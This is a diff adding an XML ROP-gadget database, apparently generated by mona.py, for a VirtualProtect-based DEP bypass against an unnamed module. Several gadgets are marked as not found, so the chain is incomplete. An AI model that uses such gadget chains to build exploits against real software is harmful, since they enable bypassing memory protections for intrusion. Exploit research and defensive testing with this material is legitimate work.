@@ -1,0 +1,31 @@
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<db>
+<rop>
+  <compatibility>
+    <target>-1.0-</target>
+  </compatibility>
+
+  <gadgets base="0x11000000">
+    <gadget value="0x00000000">[-] Unable to find gadgets to pickup the desired API pointer into esi</gadget>
+    <gadget value="junk">Filler</gadget>
+    <gadget offset="0x00018030">ptr to VirtualProtect()  ** ASLR</gadget>
+    <gadget offset="0x00015a7e">POP EAX # POP EBP # RETN  ** ASLR</gadget>
+    <gadget value="0xfffffff8">put delta into eax (-> put 0x00000000 into ebp)</gadget>
+    <gadget value="junk">Filler</gadget>
+    <gadget offset="0x00010430">ADD EAX,8 # RETN  ** ASLR</gadget>
+    <gadget offset="0x0001206d">XCHG EAX,EBP # RETN  ** ASLR</gadget>
+    <gadget value="0x00000000">[-] Unable to find gadget to put 00000201 into ebx</gadget>
+    <gadget value="junk">Filler</gadget>
+    <gadget value="0x00000000">[-] Unable to find gadget to put 00000040 into edx</gadget>
+    <gadget value="junk">Filler</gadget>
+    <gadget offset="0x00010df0">POP ECX # RETN  ** ASLR</gadget>
+    <gadget offset="0x0002187e">Writable location  ** ASLR</gadget>
+    <gadget offset="0x00017011">POP EDI # RETN  ** ASLR</gadget>
+    <gadget offset="0x00017086">RETN (ROP NOP)  ** ASLR</gadget>
+    <gadget offset="0x00015a7e">POP EAX # POP EBP # RETN  ** ASLR</gadget>
+    <gadget value="0x90909090">nop</gadget>
+    <gadget value="junk">Filler</gadget>
+    <gadget offset="0x00000000">Unable to find PUSHAD gadget</gadget>
+  </gadgets>
+</rop>
+</db>
